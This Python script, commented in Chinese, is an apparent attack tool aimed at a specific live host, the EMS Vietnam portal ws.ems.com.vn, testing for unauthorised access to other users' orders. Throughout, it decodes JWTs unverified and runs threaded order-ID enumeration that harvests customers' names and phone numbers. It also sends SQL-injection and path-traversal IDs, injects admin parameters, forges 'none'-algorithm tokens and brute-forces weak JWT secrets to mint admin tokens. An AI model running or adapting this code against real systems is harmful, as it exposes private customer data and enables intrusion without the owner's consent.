#!/usr/bin/env python3
"""
EMS Portal - 越权访问深度测试工具
专门测试能否用TokenA访问用户B的订单
"""

import requests
import json
import jwt
import sys
import time
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class UnauthorizedAccessTest:
    def __init__(self, token):
        self.token = token
        self.base_url = "http://ws.ems.com.vn"
        self.findings = []
        self.my_user_info = None
    
    def print_banner(self):
        print(f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════╗
║   EMS Portal - 越权访问深度测试                         ║
║   目标: 测试能否访问其他用户的订单                      ║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}

{Colors.YELLOW}测试策略:{Colors.RESET}
  1. 分析JWT Token，提取user_id
  2. 测试订单ID遍历 (IDOR)
  3. 尝试参数注入绕过
  4. 测试商家后台端点
  5. Token伪造/弱密钥测试
  6. 批量导出测试

{Colors.CYAN}关键: 如果能访问到不属于Token用户的订单 → 越权成功!{Colors.RESET}
        """)
    
    def analyze_token(self):
        """分析JWT Token"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[1] 分析JWT Token{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        try:
            decoded = jwt.decode(self.token, options={"verify_signature": False})
            
            print(f"{Colors.YELLOW}Token完整内容:{Colors.RESET}")
            print(json.dumps(decoded, indent=2, ensure_ascii=False))
            
            # 提取关键信息
            user_id = decoded.get('user_id') or decoded.get('sub') or decoded.get('id')
            merchant_id = decoded.get('merchant_id')
            phone = decoded.get('phone')
            email = decoded.get('email')
            role = decoded.get('role') or decoded.get('user_type')
            
            self.my_user_info = {
                'user_id': user_id,
                'merchant_id': merchant_id,
                'phone': phone,
                'email': email,
                'role': role
            }
            
            print(f"\n{Colors.GREEN}提取的用户信息:{Colors.RESET}")
            print(f"  User ID: {user_id}")
            print(f"  Merchant ID: {merchant_id}")
            print(f"  Phone: {phone}")
            print(f"  Email: {email}")
            print(f"  Role: {role}")
            
            return decoded
        
        except Exception as e:
            print(f"{Colors.RED}Token解析失败: {e}{Colors.RESET}")
            print(f"{Colors.YELLOW}Token格式可能不是标准JWT{Colors.RESET}")
            return None
    
    def test_idor_comprehensive(self):
        """综合IDOR测试"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[2] IDOR综合测试{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        # 多种ID格式测试
        id_ranges = [
            ("数字ID小", range(1, 100)),
            ("数字ID中", range(1000, 1100)),
            ("数字ID大", range(1000000, 1000100)),
        ]
        
        for range_name, id_range in id_ranges:
            print(f"{Colors.YELLOW}测试范围: {range_name}{Colors.RESET}")
            
            found = 0
            for order_id in list(id_range)[:20]:  # 每个范围测试20个
                try:
                    r = requests.get(
                        f"{self.base_url}/api/v1/orders/tracking/{order_id}",
                        headers=headers,
                        timeout=3
                    )
                    
                    if r.status_code == 200:
                        data = r.json()
                        
                        if data.get('code') == 'success':
                            found += 1
                            order_data = data.get('data', {})
                            customer = order_data.get('customer_name', 'N/A')
                            phone = order_data.get('phone', 'N/A')
                            
                            # 检查是否是当前用户
                            is_mine = (phone == self.my_user_info.get('phone') if self.my_user_info else False)
                            
                            if not is_mine and phone != 'N/A':
                                print(f"  {Colors.RED}[!!!] IDOR! ID={order_id}{Colors.RESET}")
                                print(f"       客户: {customer}, 电话: {phone}")
                                self.findings.append(('IDOR', order_id, order_data))
                            else:
                                print(f"  {Colors.GREEN}[+] ID={order_id}{Colors.RESET}")
                
                except Exception as e:
                    pass
                
                time.sleep(0.1)
            
            print(f"  找到 {found} 个可访问的订单\n")
    
    def test_wildcard_access(self):
        """通配符访问测试"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[3] 通配符/特殊ID测试{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        # 特殊ID值
        special_ids = [
            "*",                    # 通配符
            "all",                  # 全部
            "0",                    # 零
            "-1",                   # 负数
            "999999999",            # 超大数
            "../",                  # 路径遍历
            "1' OR '1'='1",        # SQL注入
            "1; DROP TABLE--",     # SQL注入
        ]
        
        for test_id in special_ids:
            try:
                r = requests.get(
                    f"{self.base_url}/api/v1/orders/tracking/{test_id}",
                    headers=headers,
                    timeout=5
                )
                
                print(f"ID='{test_id}': [{r.status_code}]", end=' ')
                
                if r.status_code == 200:
                    data = r.json()
                    
                    if data.get('code') == 'success':
                        print(f"{Colors.RED}✅ 成功!{Colors.RESET}")
                        print(f"  数据: {str(data)[:100]}...")
                        self.findings.append(('Special ID', test_id, data))
                    else:
                        print(f"{data.get('message', '')[:50]}")
                else:
                    print()
            
            except Exception as e:
                print(f"{e}")
    
    def test_parameter_injection(self):
        """参数注入越权测试"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[4] 参数注入测试{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        # 各种参数组合
        injection_tests = [
            {"limit": 100, "page": 1, "user_id": "1"},
            {"limit": 100, "page": 1, "merchant_id": "1"},
            {"limit": 100, "page": 1, "merchant_id": "999"},
            {"limit": 100, "page": 1, "admin": "true"},
            {"limit": 100, "page": 1, "role": "admin"},
            {"limit": 100, "page": 1, "filter": "all"},
            {"limit": 100, "page": 1, "scope": "global"},
            {"limit": 10000, "page": 1},  # 超大limit
        ]
        
        baseline_count = None
        
        for params in injection_tests:
            try:
                r = requests.get(
                    f"{self.base_url}/api/v1/orders/list",
                    headers=headers,
                    params=params,
                    timeout=5
                )
                
                if r.status_code == 200:
                    data = r.json()
                    
                    if data.get('code') == 'success':
                        orders = data.get('data', {}).get('orders', [])
                        count = len(orders)
                        
                        print(f"{Colors.YELLOW}参数: {params}{Colors.RESET}")
                        print(f"  返回: {count} 个订单")
                        
                        # 与基准对比
                        if baseline_count is None:
                            baseline_count = count
                        elif count > baseline_count * 1.5:
                            print(f"  {Colors.RED}⚠️ 返回数量异常增加! (基准:{baseline_count}){Colors.RESET}")
                            self.findings.append(('Param Injection', params, count))
                        
                        # 检查是否包含其他用户数据
                        if count > 0 and self.my_user_info:
                            my_phone = self.my_user_info.get('phone')
                            for order in orders:
                                order_phone = order.get('phone')
                                if order_phone and order_phone != my_phone:
                                    print(f"  {Colors.RED}[!!!] 发现其他用户订单!{Colors.RESET}")
                                    print(f"       电话: {order_phone} (我的:{my_phone})")
                                    self.findings.append(('Unauthorized Access', params, order))
                                    break
            
            except Exception as e:
                print(f"参数: {params} → 错误: {e}")
    
    def test_merchant_endpoints(self):
        """商家后台端点测试"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[5] 商家后台端点测试{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        be_endpoints = [
            ("/api/v1/be/orders/list", {"limit": 1000}),
            ("/api/v1/be/list-address", {}),
            ("/api/v1/be/config/list-status", {}),
        ]
        
        for endpoint, params in be_endpoints:
            try:
                r = requests.get(
                    self.base_url + endpoint,
                    headers=headers,
                    params=params,
                    timeout=10
                )
                
                print(f"[{r.status_code}] {endpoint}")
                
                if r.status_code == 200:
                    data = r.json()
                    
                    if data.get('code') == 'success':
                        data_size = len(str(data))
                        print(f"  {Colors.GREEN}✅ 可访问! 数据: {data_size} bytes{Colors.RESET}")
                        
                        if data_size > 10000:
                            print(f"  {Colors.RED}⚠️ 大量数据! 可能包含全局信息{Colors.RESET}")
                            self.findings.append(('BE Endpoint Access', endpoint, data_size))
                    else:
                        print(f"  {data.get('message', '')[:60]}")
                else:
                    print(f"  HTTP {r.status_code}")
            
            except Exception as e:
                print(f"  错误: {e}")
    
    def test_jwt_forge(self):
        """JWT伪造测试"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[6] JWT Token伪造测试{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        try:
            decoded = jwt.decode(self.token, options={"verify_signature": False})
            
            # 测试1: none算法
            print(f"{Colors.YELLOW}[a] 测试none算法{Colors.RESET}")
            modified = decoded.copy()
            modified['user_id'] = "1"
            
            import base64
            header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip('=')
            
            payload = base64.urlsafe_b64encode(
                json.dumps(modified).encode()
            ).decode().rstrip('=')
            
            fake_token = f"{header}.{payload}."
            
            r = requests.get(
                f"{self.base_url}/api/v1/orders/list",
                headers={"Authorization": f"Bearer {fake_token}"},
                timeout=5
            )
            
            if r.json().get('code') == 'success':
                print(f"  {Colors.RED}✅ none算法成功! 可伪造Token!{Colors.RESET}")
                self.findings.append(('JWT none bypass', fake_token[:50], r.json()))
            else:
                print(f"  ❌ none算法被阻止")
            
            # 测试2: 弱密钥爆破
            print(f"\n{Colors.YELLOW}[b] 弱密钥爆破{Colors.RESET}")
            weak_secrets = [
                "secret", "123456", "password", "admin", 
                "ems", "vietnam", "ems123", "ems2024", 
                "emsportal", "admin123", "ems@2024",
                "emsvietnam", "ws.ems.com.vn"
            ]
            
            for secret in weak_secrets:
                try:
                    jwt.decode(self.token, secret, algorithms=["HS256"])
                    print(f"  {Colors.RED}{Colors.BOLD}✅✅✅ 找到密钥: {secret}{Colors.RESET}")
                    self.findings.append(('Weak JWT Secret', secret, None))
                    
                    # 如果找到密钥，生成任意Token
                    admin_payload = {
                        'user_id': '1',
                        'role': 'admin',
                        'merchant_id': '1',
                        'exp': 9999999999
                    }
                    admin_token = jwt.encode(admin_payload, secret, algorithm="HS256")
                    print(f"  {Colors.RED}可生成任意Token:{Colors.RESET}")
                    print(f"    {admin_token}")
                    
                    return secret
                
                except jwt.InvalidSignatureError:
                    pass
                except Exception:
                    pass
            
            print(f"  ❌ 未找到弱密钥 (测试了{len(weak_secrets)}个)")
        
        except Exception as e:
            print(f"{Colors.RED}Token操纵失败: {e}{Colors.RESET}")
        
        return None
    
    def test_mass_idor_scan(self, start_id, count=100):
        """大规模IDOR扫描"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[7] 大规模IDOR扫描{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        print(f"范围: {start_id} - {start_id + count}")
        print(f"正在扫描...\n")
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        idor_found = []
        my_phone = self.my_user_info.get('phone') if self.my_user_info else None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {}
            
            for i in range(count):
                order_id = start_id + i
                future = executor.submit(self._test_single_order, order_id, headers, my_phone)
                futures[future] = order_id
            
            for future in futures:
                result = future.result()
                if result:
                    idor_found.append(result)
        
        print(f"\n{Colors.BOLD}扫描结果:{Colors.RESET}")
        print(f"  测试订单: {count}")
        print(f"  可访问: {len(idor_found)}")
        print(f"  {Colors.RED}越权订单: {sum(1 for r in idor_found if not r['is_mine'])}{Colors.RESET}")
        
        return idor_found
    
    def _test_single_order(self, order_id, headers, my_phone):
        """测试单个订单"""
        try:
            r = requests.get(
                f"{self.base_url}/api/v1/orders/tracking/{order_id}",
                headers=headers,
                timeout=5
            )
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    order_data = data.get('data', {})
                    phone = order_data.get('phone', '')
                    customer = order_data.get('customer_name', '')
                    
                    is_mine = (phone == my_phone) if my_phone else False
                    
                    if not is_mine and phone:
                        print(f"{Colors.RED}[!!!] IDOR! ID={order_id}, 客户:{customer}, 电话:{phone}{Colors.RESET}")
                    
                    return {
                        'id': order_id,
                        'is_mine': is_mine,
                        'phone': phone,
                        'customer': customer,
                        'data': order_data
                    }
        
        except:
            pass
        
        return None
    
    def comprehensive_test(self):
        """运行所有测试"""
        self.print_banner()
        
        # 1. 分析Token
        token_data = self.analyze_token()
        
        # 2. JWT伪造测试
        secret = self.test_jwt_forge()
        
        # 3. 特殊ID测试
        self.test_wildcard_access()
        
        # 4. 参数注入
        self.test_parameter_injection()
        
        # 5. 商家端点
        self.test_merchant_endpoints()
        
        # 6. 大规模IDOR (如果前面没找到，试试大范围)
        print(f"\n{Colors.YELLOW}[?] 是否进行大规模IDOR扫描? (y/N){Colors.RESET}")
        print(f"{Colors.YELLOW}    这将测试1000个订单ID{Colors.RESET}")
        
        # 自动执行小范围测试
        print(f"{Colors.CYAN}[*] 执行小范围测试 (100个ID)...{Colors.RESET}")
        idor_results = self.test_mass_idor_scan(1000000, 100)
        
        # 总结
        self.print_summary()
    
    def print_summary(self):
        """打印总结"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}越权测试总结报告{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
        
        if self.findings:
            print(f"{Colors.RED}{Colors.BOLD}[!!!] 发现 {len(self.findings)} 个越权漏洞!{Colors.RESET}\n")
            
            for finding_type, detail, data in self.findings:
                print(f"{Colors.RED}• {finding_type}{Colors.RESET}")
                print(f"  {detail}")
                print()
            
            print(f"{Colors.RED}{Colors.BOLD}结论: 存在严重的越权访问漏洞!{Colors.RESET}")
            print(f"{Colors.RED}可以访问其他用户的订单数据!{Colors.RESET}")
        
        else:
            print(f"{Colors.YELLOW}[-] 未发现明显的越权漏洞{Colors.RESET}\n")
            
            print(f"{Colors.CYAN}可能的原因:{Colors.RESET}")
            print(f"  1. 后端正确验证了订单所有权")
            print(f"  2. 测试的订单ID不存在")
            print(f"  3. 需要使用多个真实账号测试")
            
            print(f"\n{Colors.YELLOW}建议:{Colors.RESET}")
            print(f"  1. 创建2个账号: A和B")
            print(f"  2. 用B创建订单，记录订单ID")
            print(f"  3. 用A的Token访问B的订单ID")
            print(f"  4. 检查是否返回成功")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='EMS Portal越权访问深度测试',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
示例:
  python3 unauthorized_access_test.py --token "eyJhbGc..."
  
测试流程:
  1. 分析JWT Token
  2. 测试各种越权向量
  3. 生成详细报告
  
如何确认IDOR:
  1. 准备两个账号
  2. 账号B创建订单，记录ID
  3. 用账号A的Token访问B的订单
  4. 如果成功 → 越权确认!
        '''
    )
    
    parser.add_argument('--token', required=True, help='Bearer Token')
    
    args = parser.parse_args()
    
    tester = UnauthorizedAccessTest(args.token)
    tester.comprehensive_test()

if __name__ == '__main__':
    main()
